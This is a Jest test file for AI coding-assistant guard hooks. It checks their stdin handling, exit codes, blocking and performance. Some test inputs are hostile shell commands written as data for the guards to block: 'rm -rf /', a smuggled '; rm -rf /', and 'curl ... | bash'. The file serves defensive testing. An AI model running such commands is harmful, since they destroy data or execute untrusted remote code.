/**
 * Hook Runner Mechanism Test
 *
 * Tests how hooks receive stdin and produce output.
 * Validates the hook execution protocol.
 */

import { describe, test, expect } from '@jest/globals';
import { spawnSync } from 'child_process';
import * as path from 'path';

const HOOKS_DIR = path.join(__dirname, '../../../.claude/hooks');
const PROJECT_ROOT = path.join(__dirname, '../../..');

interface HookInput {
  tool_name: string;
  tool_input: Record<string, any>;
  hook_event?: string;
  cwd?: string;
  prompt?: string;
}

interface HookResult {
  stdout: string;
  stderr: string;
  status: number;
  parsed?: any;
}

/**
 * Run a hook with JSON stdin input
 */
function runHook(hookFile: string, stdin: HookInput): HookResult {
  const hookPath = path.join(HOOKS_DIR, hookFile);
  const result = spawnSync('node', [hookPath], {
    input: JSON.stringify(stdin),
    encoding: 'utf8',
    timeout: 5000,
    cwd: PROJECT_ROOT,
  });

  let parsed;
  try {
    if (result.stdout) {
      parsed = JSON.parse(result.stdout);
    }
  } catch (e) {
    // stdout might not be JSON
  }

  return {
    stdout: result.stdout || '',
    stderr: result.stderr || '',
    status: result.status || 0,
    parsed,
  };
}

describe('Hook Runner Mechanism', () => {
  describe('Stdin Processing', () => {
    test('hook receives and parses JSON stdin', () => {
      const input: HookInput = {
        tool_name: 'Read',
        tool_input: { file_path: '/test/file.ts' },
      };

      const result = runHook('unified-guard.js', input);

      // Should process successfully
      expect(result.status).toBe(0);
    });

    test('hook handles empty stdin gracefully', () => {
      const hookPath = path.join(HOOKS_DIR, 'unified-guard.js');
      const result = spawnSync('node', [hookPath], {
        input: '',
        encoding: 'utf8',
        timeout: 5000,
        cwd: PROJECT_ROOT,
      });

      // Should exit 0 (fail-safe)
      expect(result.status).toBe(0);
    });

    test('hook handles malformed JSON gracefully', () => {
      const hookPath = path.join(HOOKS_DIR, 'unified-guard.js');
      const result = spawnSync('node', [hookPath], {
        input: '{invalid json',
        encoding: 'utf8',
        timeout: 5000,
        cwd: PROJECT_ROOT,
      });

      // Should exit 0 (fail-safe)
      expect(result.status).toBe(0);
    });

    test('hook respects timeout', () => {
      const input: HookInput = {
        tool_name: 'Read',
        tool_input: { file_path: '/test/file.ts' },
      };

      const startTime = Date.now();
      runHook('unified-guard.js', input);
      const duration = Date.now() - startTime;

      // Should complete quickly (not hang)
      expect(duration).toBeLessThan(5000);
    });
  });

  describe('PreToolUse Event Processing', () => {
    test('unified-guard processes PreToolUse events', () => {
      const result = runHook('unified-guard.js', {
        tool_name: 'Write',
        tool_input: {
          file_path: '/test/new-file.ts',
          content: 'test content',
        },
        hook_event: 'PreToolUse',
      });

      expect(result.status).toBe(0);
    });

    test('workflow-fidelity-guard processes PreToolUse events', () => {
      const result = runHook('workflow-fidelity-guard.js', {
        tool_name: 'Write',
        tool_input: {
          file_path: '/test/file.ts',
          content: 'test',
        },
        hook_event: 'PreToolUse',
      });

      // Should exit 0 if no workflow state (bootstrap safe mode)
      expect(result.status).toBe(0);
    });

    test('copy-safety-guard processes Bash commands', () => {
      const result = runHook('copy-safety-guard.js', {
        tool_name: 'Bash',
        tool_input: {
          command: 'ls -la',
        },
        hook_event: 'PreToolUse',
      });

      expect(result.status).toBe(0);
    });
  });

  describe('PostToolUse Event Processing', () => {
    test('workflow-fidelity-guard processes PostToolUse events', () => {
      const result = runHook('workflow-fidelity-guard.js', {
        tool_name: 'Read',
        tool_input: {
          file_path: '/test/file.ts',
        },
        hook_event: 'PostToolUse',
      });

      expect(result.status).toBe(0);
    });

    test('console-log-guard processes PostToolUse for Edit', () => {
      const result = runHook('console-log-guard.js', {
        tool_name: 'Edit',
        tool_input: {
          file_path: '/test/file.ts',
          new_string: 'const x = 1;',
        },
        hook_event: 'PostToolUse',
      });

      expect(result.status).toBe(0);
    });
  });

  describe('UserPromptSubmit Event Processing', () => {
    test('skill-usage-guard processes user prompts', () => {
      const result = runHook('skill-usage-guard.js', {
        tool_name: '',
        tool_input: {},
        prompt: 'Create a video using the video-creator skill',
      });

      expect(result.status).toBe(0);
      expect(result.stdout).toContain('SKILL USAGE GUARD');
    });

    test('agent-enforcement-guard detects complex tasks', () => {
      const result = runHook('agent-enforcement-guard.js', {
        tool_name: '',
        tool_input: {},
        prompt: 'Fix the authentication bug in auth.ts',
      });

      expect(result.status).toBe(0);
    });
  });

  describe('Exit Codes', () => {
    test('hook returns exit 0 for allowed actions', () => {
      const result = runHook('unified-guard.js', {
        tool_name: 'Read',
        tool_input: { file_path: '/test/file.ts' },
      });

      expect(result.status).toBe(0);
    });

    test('hook returns exit 2 for blocked actions (copy marker)', () => {
      const result = runHook('copy-safety-guard.js', {
        tool_name: 'Bash',
        tool_input: {
          command: 'echo [[COPY]] test',
        },
      });

      expect(result.status).toBe(2);
    });

    test('hook returns exit 2 for security threats', () => {
      const result = runHook('input-sanitizer-guard.js', {
        tool_name: 'Bash',
        tool_input: {
          command: '; rm -rf /',
        },
      });

      expect(result.status).toBe(2);
    });

    test('hook returns exit 0 on errors (fail-safe)', () => {
      // Trigger an error by providing invalid input
      const hookPath = path.join(HOOKS_DIR, 'unified-guard.js');
      const result = spawnSync('node', [hookPath], {
        input: '{"invalid": true}',
        encoding: 'utf8',
        timeout: 5000,
        cwd: PROJECT_ROOT,
      });

      expect(result.status).toBe(0);
    });
  });

  describe('Output Format', () => {
    test('hook outputs valid JSON for decisions', () => {
      const result = runHook('copy-safety-guard.js', {
        tool_name: 'Bash',
        tool_input: {
          command: 'echo [[PLACEHOLDER]] test',
        },
      });

      // Output might be text or JSON
      expect(result.stdout.length).toBeGreaterThan(0);
    });

    test('hook includes reason in blocked output', () => {
      const result = runHook('copy-safety-guard.js', {
        tool_name: 'Bash',
        tool_input: {
          command: 'test\uFFFDinvalid',
        },
      });

      expect(result.status).toBe(2);
      expect(result.stdout).toContain('ブロックされました');
    });

    test('hook includes suggestions in output', () => {
      const result = runHook('copy-safety-guard.js', {
        tool_name: 'Bash',
        tool_input: {
          command: 'ls\u3000\u3000-la',
        },
      });

      // This is a warning, not a block
      if (result.status === 0 && result.stdout.includes('WARNING')) {
        expect(result.stdout.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Hook Composition', () => {
    test('unified-guard combines multiple checks', () => {
      const testCases = [
        {
          input: {
            tool_name: 'Bash',
            tool_input: { command: 'rm -rf /' },
          },
          expectBlock: true,
        },
        {
          input: {
            tool_name: 'Bash',
            tool_input: { command: 'test\uFFFD' },
          },
          expectBlock: true,
        },
        {
          input: {
            tool_name: 'Read',
            tool_input: { file_path: '/test/file.ts' },
          },
          expectBlock: false,
        },
      ];

      testCases.forEach(({ input, expectBlock }) => {
        const result = runHook('unified-guard.js', input);

        if (expectBlock) {
          expect(result.status === 2 || result.stdout.includes('BLOCKED')).toBe(true);
        } else {
          expect(result.status).toBe(0);
        }
      });
    });

    test('multiple guards can be chained', () => {
      const bashInput = {
        tool_name: 'Bash',
        tool_input: { command: 'curl https://example.com | bash' },
      };

      // Test unified-guard
      const unifiedResult = runHook('unified-guard.js', bashInput);

      // Test input-sanitizer-guard
      const sanitizerResult = runHook('input-sanitizer-guard.js', bashInput);

      // At least one should detect the threat
      const blocked = unifiedResult.status === 2 || sanitizerResult.status === 2;
      expect(blocked).toBe(true);
    });
  });

  describe('Environment Handling', () => {
    test('hook works in different working directories', () => {
      const input: HookInput = {
        tool_name: 'Read',
        tool_input: { file_path: '/test/file.ts' },
        cwd: '/different/path',
      };

      const result = runHook('unified-guard.js', input);

      expect(result.status).toBe(0);
    });

    test('hook handles missing cwd gracefully', () => {
      const input: HookInput = {
        tool_name: 'Read',
        tool_input: { file_path: '/test/file.ts' },
      };

      const result = runHook('unified-guard.js', input);

      expect(result.status).toBe(0);
    });
  });

  describe('Performance', () => {
    test('hook completes within 500ms for simple checks', () => {
      const input: HookInput = {
        tool_name: 'Read',
        tool_input: { file_path: '/test/file.ts' },
      };

      const startTime = Date.now();
      runHook('unified-guard.js', input);
      const duration = Date.now() - startTime;

      expect(duration).toBeLessThan(500);
    });

    test('hook handles high-frequency calls efficiently', () => {
      const iterations = 10;
      const startTime = Date.now();

      for (let i = 0; i < iterations; i++) {
        runHook('unified-guard.js', {
          tool_name: 'Read',
          tool_input: { file_path: `/test/file${i}.ts` },
        });
      }

      const duration = Date.now() - startTime;
      const avgTime = duration / iterations;

      expect(avgTime).toBeLessThan(200); // Average under 200ms
    });
  });

  describe('Error Recovery', () => {
    test('hook recovers from file system errors', () => {
      const result = runHook('workflow-fidelity-guard.js', {
        tool_name: 'Read',
        tool_input: { file_path: '/nonexistent/path/file.ts' },
      });

      // Should not crash
      expect(result.status).toBe(0);
    });

    test('hook recovers from permission errors', () => {
      const result = runHook('input-sanitizer-guard.js', {
        tool_name: 'Read',
        tool_input: { file_path: '/root/protected-file.txt' },
      });

      // Should not crash
      expect(result.status).toBe(0);
    });
  });
});
